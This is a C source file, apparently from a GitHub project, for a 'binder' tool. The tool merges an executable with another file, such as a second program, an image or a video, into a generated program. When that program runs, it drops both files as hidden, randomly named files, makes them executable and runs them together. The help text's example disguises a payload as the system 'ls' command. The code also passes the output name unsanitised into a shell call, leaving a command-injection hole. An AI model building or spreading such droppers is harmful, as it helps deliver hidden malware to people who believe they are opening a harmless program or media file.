#include "exeTOexe.h"

void seyArgError()
{
	printf(
	"\033[91mNAME\033[0m\n"
	"	IAIngectioner - a tools for create executable media\n"
	"\n"
	"\033[91mSYNOPSIS\033[0m\n"
	"	binder [first executable FILE] [second FILE] [output FILE]\n"
	"\n"
	"\033[91mEXAMPLE\033[0m\n"
	"	binder ./application /user/bin/ls ls\n"
	"	binder ./application ./image.png\n"
	"	binder ./application ./video.mp3\n"
	"\n"
	"	and another media\n"
	"\n"
	"\033[91mGITHUB\033[0m\n"
	"	https://github.com/alirezaarzehgar/IA-Injectioner-1.0.git"
	"	\n"

		);
}

int xxd_i(char* argv1, char* argv2)
{
        char* str1 = (char*) malloc (sizeof(char*)*1000000);
        char* str2 = (char*) malloc (sizeof(char*)*1000000);

        int arg1_len;
        int arg2_len;

        FILE* f = fopen(argv1, "r");

        for(arg1_len = 0; 1; arg1_len++)
        {
                str1[arg1_len] = fgetc(f);
                if(feof(f)) break;
        }
        fclose(f);

        f = fopen(argv2, "r");

        for(arg2_len = 0; 1; arg2_len++)
        {
                str2[arg2_len] = fgetc(f);
                if(feof(f)) break;
        }
        fclose(f);

        //..................


        f = fopen(".h.h", "w");

        fprintf(f, "#ifndef H_H_\n#define H_H_\n\nunsigned char pro_one[] =\n{\n");

        for(int i = 0; i < arg1_len; i++)
        {
                fprintf(f, "  %d,", str1[i]);
                if(i % 6 == 0) fprintf(f, "\n");
        }

        fputs("  0\n};", f);

        fprintf(f, "\n\nunsigned int pro_one_len = %d;\n", arg1_len);

        //..................

        fprintf(f, "\nunsigned char pro_two[] =\n{\n");

        for(int i = 0; i < arg2_len; i++)
        {
                fprintf(f, "  %d,", str2[i]);
                if(i % 6 == 0) fprintf(f, "\n");
        }

        fputs("  0\n};", f);

        fprintf(f, "\n\nunsigned int pro_two_len = %d;\n\n#endif", arg2_len);
	fclose(f);

        return 1;
}

void programs_run(char* argv)
{
        char command[1000];
        sprintf(command, "gcc -w -o %s .p.c `pkg-config --libs --cflags gtk+-2.0`", argv);
        system(command);
}

void exeTOexeInP_c()
{
        FILE* f = fopen(".p.c", "w");
        fprintf(f,
                                        "#include <stdio.h>\n"
                                        "#include <stdlib.h>\n"
                                        "#include <sys/stat.h>\n"
                                        "#include <pthread.h>\n"
					"#include <time.h>\n"
                                        "#include \".h.h\"\n"
                                        "\n"
                                        "void* exec_1(void* arg);\n"
                                        "void* exec_2(void* arg);\n"
                                        "\n\n"
					"char rand1[100];\n"
					"char rand2[100];\n"
                                        "int main()\n"
                                        "{\n"
					"	 srand(time(NULL));\n"
					"	 sprintf(rand1, \"./.%%d%%d%%d\", rand() % 10, rand() % 10, rand() % 10);\n"
                                        "        sprintf(rand2, \"./.%%d%%d%%d\", rand() % 10, rand() % 10, rand() % 10);\n"
                                        "        FILE* f = fopen(rand1, \"wb\");\n"
                                        "        for(int i = 0; i < pro_one_len; i++) fprintf(f, \"%%c\", pro_one[i]);\n"
                                        "        fclose(f);\n"
                                        "\n"
                                        "        f = fopen(rand2, \"wb\");\n"
                                        "        for(int i = 0; i < pro_two_len; i++) fprintf(f, \"%%c\", pro_two[i]);\n"
                                        "        fclose(f);\n"
                                        "\n"
                                        "        chmod(rand1, 0775);\n"
                                        "        chmod(rand2, 0775);\n"
                                        "\n"
                                        "        pthread_t id;\n"
                                        "        pthread_create(&id, NULL, &exec_1, NULL);\n"
                                        "        pthread_create(&id, NULL, &exec_2, NULL);\n"
                                        "\n"
                                        "        while(1);\n"
                                        "        return 0;\n"
                                        "}\n"
                                        "\n"
                                        "void* exec_1(void* arg)\n"
                                        "{\n"
                                        "        system(rand1);\n"
                                        "        while(1);\n"
                                        "}\n"
                                        "\n"
                                        "void* exec_2(void* arg)\n"
                                        "{\n"
                                        "        system(rand2);\n"
                                        "        while(1);\n"
                                        "}\n"

	);
	fclose(f);

}

bool istrue(const char* str1, char* str2, int a)
{
        bool gh = true;

        for(int i = 0; i < a; i++)
        {
                if(str1[i] != str2[i])
                {
                        gh = false;
                        break;
                }
        }

        return gh;
}

bool file_exist(char* FILE_NAME)
{
	if(fopen(FILE_NAME, "r") != NULL) return true;
	else return false;
}

bool isExecutable(char* FILE_NAME)
{
	struct stat st;
	stat(FILE_NAME, &st);
	if(st.st_mode & S_IXUSR) return true;
	else return false;
}

bool isImage(char* FILE_NAME)
{
	if(strstr(FILE_NAME, ".png") || strstr(FILE_NAME, ".jpg") || strstr(FILE_NAME, ".jpeg")) return true;
	else return false;
}
